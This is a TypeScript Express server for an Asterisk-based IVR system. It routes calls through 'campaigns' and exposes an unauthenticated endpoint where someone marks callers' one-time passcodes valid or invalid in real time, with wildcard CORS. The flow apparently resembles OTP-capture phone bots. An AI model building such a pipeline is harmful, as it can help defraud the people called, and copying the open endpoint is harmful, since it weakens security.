import express, { Express, Request, Response } from 'express';
import { createServer } from 'http';
import { TrunkRoutes } from './api/routes/trunk-routes';
import { CallRoutes } from './api/routes/call-routes';
import { ActionRoutes } from './api/routes/action-routes';
import { TrunkService } from './modules/trunks/trunk-service';
import { ARIService } from './modules/ari/ari-service';
import { CampaignService } from './modules/campaigns/campaign-service';
import { WebSocketService } from './modules/websocket/websocket-service';
import { CallStore } from './store/call-store';

/**
 * Unified IVR Orchestrator
 * Servidor principal que unifica el sistema de trunks, ARI y WebSocket
 */
export class UnifiedIVROrchestrator {
    private app: Express;
    private httpServer: any;
    private trunkService: TrunkService;
    private ariService: ARIService;
    private webSocketService: WebSocketService;
    
    constructor() {
        this.app = express();
        this.httpServer = createServer(this.app);
        this.trunkService = TrunkService.getInstance();
        this.ariService = ARIService.getInstance();
        this.webSocketService = WebSocketService.getInstance();
        
        this.initializeMiddlewares();
        this.initializeRoutes();
    }
    
    /**
     * Inicializa los middlewares
     */
    private initializeMiddlewares(): void {
        // CORS
        this.app.use((req: Request, res: Response, next) => {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
            
            if (req.method === 'OPTIONS') {
                res.writeHead(200);
                res.end();
                return;
            }
            next();
        });
        
        // JSON parser
        this.app.use(express.json());
        
        // Logging middleware
        this.app.use((req: Request, res: Response, next) => {
            next();
        });
    }
    
    /**
     * Inicializa las rutas
     */
    private initializeRoutes(): void {

        // Trunk routes
        const trunkRoutes = new TrunkRoutes();
        this.app.use('/api/trunks', trunkRoutes.router);
        
        // Call routes
        const callRoutes = new CallRoutes();
        this.app.use('/api/calls', callRoutes.router);
        
        // Action routes (IVR)
        const actionRoutes = new ActionRoutes();
        this.app.use('/action', actionRoutes.router);
        
        // OTP validation endpoints
        this.app.post('/otp/validate/:callId', async (req: Request, res: Response) => {
            const { callId } = req.params;
            const { isValid } = req.body;
            
            
            try {
                const callStore = CallStore.getInstance();
                const campaignService = CampaignService.getInstance();
                const callData = callStore.getCall(callId);
                const campaign = callData?.campaign;
                const gatherStage = callData?.gatherStage;
                
                // ✅ DETECTAR AUTOMÁTICAMENTE si la campaña tiene dos gathers (verifica si existe gather1)
                const gather1Action = campaign ? await campaignService.getActionData(campaign, 'gather1') : null;
                const isTwoGatherCampaign = gather1Action !== null;
                
                if (isValid) {
                    // ✅ OTP VÁLIDO
                    if (isTwoGatherCampaign) {
                        // Campaña con dos Gather
                        // 🔧 FIX: Siempre redirigir a confirm, confirm decide según gatherStage
                        if (!gatherStage || gatherStage === 'first') {
                            // Primer gather (después de confirm) → marcar second y redirigir a gather1
                            callStore.updateCall(callId, { gatherStage: 'second' });
                            const targetAction = 'gather1';
                            
                            
                            const result = await this.ariService.setChannelAction(callId, `http://localhost:3000/action/${targetAction}`);
                            
                            this.webSocketService.sendToCallId(callId, {
                                callId: callId,
                                OtpValidation: 'valid',
                                gatherStage: 'second'
                            });
                        } else if (gatherStage === 'second') {
                            // Segundo gather (después de gather1) → redirigir directamente a completed
                            const targetAction = 'completed';
                            
                            
                            const result = await this.ariService.setChannelAction(callId, `http://localhost:3000/action/${targetAction}`);
                            
                            this.webSocketService.sendToCallId(callId, {
                                callId: callId,
                                OtpValidation: 'valid',
                                gatherStage: 'completed'
                            });
                        }
                    } else {
                        // Campaña normal (un solo Gather) - lógica original
                        const selectedOption = callData?.selectedOption;
                        
                        let targetAction: string;
                        if (selectedOption === '1') {
                            targetAction = 'completed_option1';
                        } else if (selectedOption === '2') {
                            targetAction = 'completed_option2';
                        } else {
                            targetAction = 'completed'; // Campañas viejas sin menú
                        }
                        
                        // Redirigir al estado correspondiente
                        const result = await this.ariService.setChannelAction(callId, `http://localhost:3000/action/${targetAction}`);
                        
                        this.webSocketService.sendToCallId(callId, {
                            callId: callId,
                            OtpValidation: 'valid',
                            selectedOption: selectedOption || null
                        });
                    }
                } else {
                    // ❌ OTP INVÁLIDO
                    if (isTwoGatherCampaign) {
                        // Campaña con dos Gather
                        if (!gatherStage || gatherStage === 'first') {
                            // Primer gather inválido → ir a invalid (mantener gatherStage: 'first')
                            
                            // 🔧 FIX: Asegurar que gatherStage se mantenga en 'first' cuando es inválido
                            callStore.updateCall(callId, { gatherStage: 'first' });
                            
                            const result = await this.ariService.setChannelAction(callId, 'http://localhost:3000/action/invalid');
                            
                            this.webSocketService.sendToCallId(callId, {
                                callId: callId,
                                OtpValidation: 'invalid',
                                gatherStage: 'first'
                            });
                        } else if (gatherStage === 'second') {
                            // Segundo gather inválido → volver a gather1 (reintentar)
                            
                            const result = await this.ariService.setChannelAction(callId, 'http://localhost:3000/action/gather1');
                            
                            this.webSocketService.sendToCallId(callId, {
                                callId: callId,
                                OtpValidation: 'invalid',
                                gatherStage: 'second'
                            });
                        }
                    } else {
                        // Campaña normal - lógica original
                        
                        const result = await this.ariService.setChannelAction(callId, 'http://localhost:3000/action/invalid');
                        
                        this.webSocketService.sendToCallId(callId, {
                            callId: callId,
                            OtpValidation: 'invalid'
                        });
                    }
                }
                
                res.json({
                    success: true,
                    message: `OTP marcado como ${isValid ? 'válido' : 'inválido'}`
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    message: 'Error procesando validación OTP'
                });
            }
        });
        
        // 404 handler
        this.app.use('*', (req: Request, res: Response) => {
            res.status(404).json({
                success: false,
                error: 'Endpoint no encontrado',
                path: req.path,
                method: req.method
            });
        });
    }
    
    /**
     * Inicializa todos los servicios
     * @param serverIp IP del servidor FreePBX (opcional, puede venir de variable de entorno)
     */
    public async initialize(serverIp?: string): Promise<void> {
        
        try {
            // Inicializar servicio de trunks
            await this.trunkService.initialize();
            
            // Inicializar servicio ARI con la IP del servidor
            await this.ariService.initialize(serverIp);
            
            // Inicializar servicio de campañas
            CampaignService.getInstance();
            
            // Inicializar WebSocket Service (después de crear httpServer)
            this.webSocketService.initialize(this.httpServer);
            

            
        } catch (error) {
            console.error('❌ Error inicializando servicios:', error);
            throw error;
        }
    }
    
    /**
     * Inicia el servidor
     */
    public start(port: number = 3000): void {
        this.httpServer.listen(port, () => {
            
        });
    }
    
    /**
     * Detiene el servidor
     */
    public stop(): void {
        this.trunkService.stop();
        this.ariService.stop();
        this.httpServer.close();
        console.log('🛑 Servidor detenido');
    }
} 